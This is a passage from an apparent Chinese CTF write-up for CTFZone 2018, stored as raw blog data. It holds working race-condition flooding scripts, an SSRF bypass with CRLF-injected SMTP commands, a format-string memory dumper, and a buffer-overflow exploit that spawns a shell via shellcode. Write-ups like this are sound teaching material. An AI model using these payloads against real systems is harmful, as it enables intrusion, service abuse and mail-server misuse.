class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\"></span><br><span class=\"line\">threadArray = []</span><br><span class=\"line\"></span><br><span class=\"line\">class expClass(threading.Thread):</span><br><span class=\"line\">    burp0_url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup&quot;</span><br><span class=\"line\">    burp0_cookies = &#123;&quot;session&quot;: &quot;eyJ1aWQiOjg2NX0.Dkaijg.3FkM2nEU3xLcIvc4DPkZxkvrjFQ&quot;&#125;</span><br><span class=\"line\">    burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-GB,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Referer&quot;: &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/info&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    def __init__(self, numMain):</span><br><span class=\"line\">        super(expClass, self).__init__()</span><br><span class=\"line\"></span><br><span class=\"line\">    def ham(self):</span><br><span class=\"line\">        requests.get(self.burp0_url, headers=self.burp0_headers, cookies=self.burp0_cookies)</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        self.ham()</span><br><span class=\"line\">        </span><br><span class=\"line\">thr = 900</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(0, thr ):</span><br><span class=\"line\">        threadcan = expClass(i)</span><br><span class=\"line\">        threadArray.append(threadcan)</span><br><span class=\"line\">        </span><br><span class=\"line\">for i in range(0, thr):</span><br><span class=\"line\">        threadArray[i].start()</span><br><span class=\"line\">        print &quot;G thread girdi =&gt; &quot; + str(i)</span><br><span class=\"line\">for i in range(0, thr):</span><br><span class=\"line\">        threadArray[i].join()</span><br><span class=\"line\">        print &quot;R thread cikti =&gt; &quot; + str(i)</span><br></pre></td></tr></table></figure>\n<p>并发方案2：</p>\n<p>首先创建两个新的账号，并获取足够的balance。</p>\n<p>race_condition.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import threading</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from Queue import Queue</span><br><span class=\"line\"></span><br><span class=\"line\">max = 100</span><br><span class=\"line\">threads = Queue()</span><br><span class=\"line\"></span><br><span class=\"line\">def lvlup(cookie):</span><br><span class=\"line\">    threads.get()</span><br><span class=\"line\">    url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup&quot;</span><br><span class=\"line\">    r = requests.get(url, cookies=&#123;&quot;session&quot;: cookie&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def worker2(index):</span><br><span class=\"line\">    lvlup(&quot;eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE&quot;)       # chrome</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def worker(index):</span><br><span class=\"line\">    lvlup(&quot;eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0&quot;)         # firefox</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def race():</span><br><span class=\"line\">    for i in range(max):</span><br><span class=\"line\">        thread = threading.Thread(target=worker, args=[i])</span><br><span class=\"line\">        thread.start()</span><br><span class=\"line\">    for i in range(max):</span><br><span class=\"line\">        thread = threading.Thread(target=worker2, args=[i])</span><br><span class=\"line\">        thread.start()</span><br><span class=\"line\">    for i in range(max * 2):</span><br><span class=\"line\">        threads.put(i)</span><br><span class=\"line\">    threads.join()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">race()</span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803232555.png\" alt=\"\"></p>\n</li>\n<li><p>SSRF</p>\n<p>通过条件竞争，到达31级别，出现了新的页面。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar</span><br></pre></td></tr></table></figure>\n<p>这里存在ssrf漏洞。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803234111.png\" alt=\"\"></p>\n<p>通过测试，可以发现过滤了<code>127.0.0.1</code>, <code>localhost</code>,可以通过<code>0.0.0.0</code>或者<code>127.0.0.2</code> bypass。</p>\n<p>端口扫描:</p>\n<p>示意图如下：</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803234335.png\" alt=\"\"></p>\n</li>\n</ol>\n<p>   经过测试，发现25端口开放。</p>\n<p>   <img src=\"/assets/ctfzone/port_scan.png\" alt=\"\"></p>\n<p>   这里存在http header注入(CRLF注入)</p>\n<p>   构造paylaod:</p>\n   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host: [0.0.0.0</span><br><span class=\"line\">helo 1v3m</span><br><span class=\"line\">mail from:&lt;qaewjlfnwej@o3enzyme.com&gt;</span><br><span class=\"line\">rcpt to:&lt;root&gt;</span><br><span class=\"line\">data</span><br><span class=\"line\">subject: give me flag</span><br><span class=\"line\"></span><br><span class=\"line\">1v3m</span><br><span class=\"line\">.</span><br><span class=\"line\">]:25</span><br></pre></td></tr></table></figure>\n<p>   最终payload:</p>\n   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25</span><br></pre></td></tr></table></figure>\n<ol start=\"7\">\n<li><p>solution1:</p>\n<p>最终请求包:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /user/avatar HTTP/1.1</span><br><span class=\"line\">Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: en-GB,en;q=0.5</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Length: 581</span><br><span class=\"line\">Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;&quot;</span><br><span class=\"line\">Content-Type: application/octet-stream</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;url&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">https://[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25</span><br><span class=\"line\">-----------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;action&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">save</span><br><span class=\"line\">-----------------------------4693211868403427471435307016--</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>solution2</p>\n<p>参考网址：<a href=\"https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg\" target=\"_blank\" rel=\"noopener\">https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HELO 127.0.0.1</span><br><span class=\"line\">MAIL FROM:&lt;A@B.c&gt;</span><br><span class=\"line\">RCPT TO:&lt;1096026150@qq.com&gt;</span><br><span class=\"line\">DATA</span><br><span class=\"line\">From: AAA@B.C</span><br><span class=\"line\">To: 1096026150@qq.com</span><br><span class=\"line\">Subject: give me flag</span><br><span class=\"line\">.</span><br><span class=\"line\">QUIT</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl &apos;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar&apos; -H &apos;Cookie: session=eyJ1aWQiOjg2NX0.Dkan9A.U5_9q25Izo0Y4yJq__o2oAdRAc0&apos; --data &apos;url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: &lt;A@B.C&gt;%0aRCPT TO: &lt;1096026150@qq.com&gt;%0aDATA%0aFROM: AAA@B.C%0aTO: 1096026150@qq.com%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&amp;action=save&apos;</span><br></pre></td></tr></table></figure>\n<p>注意，<code>url</code>需要使用<code>https</code>,ip地址除了<code>127.0.0.2</code>,也可以使用<code>0.0.0.0</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define DEF_SMTPD_FORBID_CMDS    &quot;CONNECT GET POST&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">        /* Ignore smtpd_forbid_cmds lookup errors. Non-critical feature. */</span><br><span class=\"line\">        if (cmdp-&gt;name == 0) &#123;</span><br><span class=\"line\">        state-&gt;where = SMTPD_CMD_UNKNOWN;</span><br><span class=\"line\">        if (is_header(argv[0].strval)</span><br><span class=\"line\">            || (*var_smtpd_forbid_cmds</span><br><span class=\"line\">         &amp;&amp; string_list_match(smtpd_forbid_cmds, argv[0].strval))) &#123;</span><br><span class=\"line\">                msg_warn(&quot;non-SMTP command from %s: %.100s&quot;,</span><br><span class=\"line\">                     state-&gt;namaddr, vstring_str(state-&gt;buffer));</span><br><span class=\"line\">                smtpd_chat_reply(state, &quot;221 2.7.0 Error: I can break rules, too. Goodbye.&quot;);</span><br><span class=\"line\">                break;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>原因:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Our mistake was missing the special case implemented in postfix:</span><br><span class=\"line\">There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands. The way to bypass this was to use https instead of http, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands. </span><br><span class=\"line\">简单来说，就是当我们使用http请求，并使用 http header注入 来注入SMTP命令的时候，会被拦截。可以使用 https， 因为 https 流量是加密过的，这样，SMTP会忽略该流量，当流量到达主机，会被解密，这时候SMTP就会收到一组漂亮的 SMTP 命令。</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803235132.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"easypwn-strings\"><a href=\"#easypwn-strings\" class=\"headerlink\" title=\"easypwn_strings\"></a>easypwn_strings</h2><p>dump.py:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">def conn():</span><br><span class=\"line\">    return remote(&apos;pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&apos;, 1234)</span><br><span class=\"line\"></span><br><span class=\"line\">def dump(adr,frmt=&apos;p&apos;):</span><br><span class=\"line\">    r.recvuntil(&apos;StrRemoveLastSymbols&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;\\n&apos;)</span><br><span class=\"line\">    r.sendline(&apos;3&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;:&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;\\n&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    leak_part = &quot;|%19$&#123;&#125;|&quot;.format(frmt)</span><br><span class=\"line\">    out = leak_part.ljust(4*10,&quot;A&quot;)+&quot;EOF_&quot;+p32(adr)</span><br><span class=\"line\">    r.sendline(out)</span><br><span class=\"line\">    r.sendline(&apos;0&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;Result:&apos;)</span><br><span class=\"line\">    return r.recvuntil(&quot;|A&quot;)[:-2].split(&quot;|&quot;)[1]</span><br><span class=\"line\"></span><br><span class=\"line\">start_addr = 0x8048750</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        fd = open(&quot;dumped_file&quot;,&quot;a&quot;)</span><br><span class=\"line\">        r = conn()</span><br><span class=\"line\">        data = dump(start_addr,&apos;s&apos;)</span><br><span class=\"line\">        print &quot;|0x%08x|%s|&quot; % (start_addr,data)</span><br><span class=\"line\">        if data == &quot;(null)&quot; or data == &quot;&quot;:</span><br><span class=\"line\">            fd.write(&quot;\\x00&quot;)</span><br><span class=\"line\">            start_addr += 1</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            fd.write(data+&quot;\\x00&quot;)</span><br><span class=\"line\">            start_addr += len(data)+1</span><br><span class=\"line\">        fd.close()</span><br><span class=\"line\">        r.close()</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print e</span><br><span class=\"line\">        print &quot;[!] execption&quot;</span><br><span class=\"line\">        break</span><br></pre></td></tr></table></figure>\n<p>payload.py:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python2</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">def recvlines(lnum):</span><br><span class=\"line\">    global p</span><br><span class=\"line\">    res=&quot;&quot;</span><br><span class=\"line\">    for x in range(lnum):</span><br><span class=\"line\">        res+=p.recvline()</span><br><span class=\"line\">    return res</span><br><span class=\"line\"> </span><br><span class=\"line\">host=&quot;pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&quot;</span><br><span class=\"line\">port=1234</span><br><span class=\"line\"> </span><br><span class=\"line\">base_buf=0x80492e0</span><br><span class=\"line\">shellcode=&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;</span><br><span class=\"line\">payload=(&quot;y&quot;+shellcode).ljust(256,&quot;\\x90&quot;)+p32(base_buf+1)</span><br><span class=\"line\">p=remote(host,port)</span><br><span class=\"line\">#p=process(&quot;./babypwn&quot;)</span><br><span class=\"line\">print recvlines(4)</span><br><span class=\"line\">p.sendline(&quot;X&quot;)</span><br><span class=\"line\">print recvlines(3)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"Piggy-Bank\"><a href=\"#Piggy-Bank\" class=\"headerlink\" title=\"Piggy Bank\"></a>Piggy Bank</h2><ol>\n<li><p>根据注释找到<em><a href=\"http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php\" target=\"_blank\" rel=\"noopener\">http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php</a></em></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">wsdl:definitions</span> <span class=\"attr\">xmlns:tns</span>=<span class=\"string\">\"urn:Bank\"</span> <span class=\"attr\">xmlns:soap</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/wsdl/soap/\"</span> <span class=\"attr\">xmlns:xsd</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema\"</span> <span class=\"attr\">xmlns:soapenc</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/encoding/\"</span> <span class=\"attr\">xmlns:wsdl</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/wsdl/\"</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/wsdl/\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"Bank\"</span> <span class=\"attr\">targetNamespace</span>=<span class=\"string\">\"urn:Bank\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BalanceRequest\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"wallet_num\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:decimal\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BalanceResponse\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"code\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:float\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"status\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransferRequest\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"receiver_wallet_num\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:decimal\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"sender_wallet_num\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:decimal\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"amount\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:float\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"token\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransferResponse\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"code\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:float\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">part</span> <span class=\"attr\">name</span>=<span class=\"string\">\"status\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xsd:string\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">portType</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankServicePort\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"requestBalance\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:BalanceRequest\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:BalanceResponse\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"internalTransfer\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:internalTransferRequest\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">output</span> <span class=\"attr\">message</span>=<span class=\"string\">\"tns:internalTransferResponse\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">operation</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">portType</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">binding</span> <span class=\"attr\">name</span>=<span class=\"string\">\"BankServiceBinding\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"tns:BankServicePort\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:binding</span> <span class=\"attr\">style</span>=<span class=\"string\">\"rpc\"</span> <span class=\"attr\">transport</span>=<span class=\"string\">\"http://schemas.xmlsoap.org/soap/http\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">operation</span> <span class=\"attr\">name</span>=<span class=\"string\">\"requestBalance\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">soap:operation</span> <span class=\"attr\">soapAction</span>=<span class=\"string\">\"urn:requestBalanceAction\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span 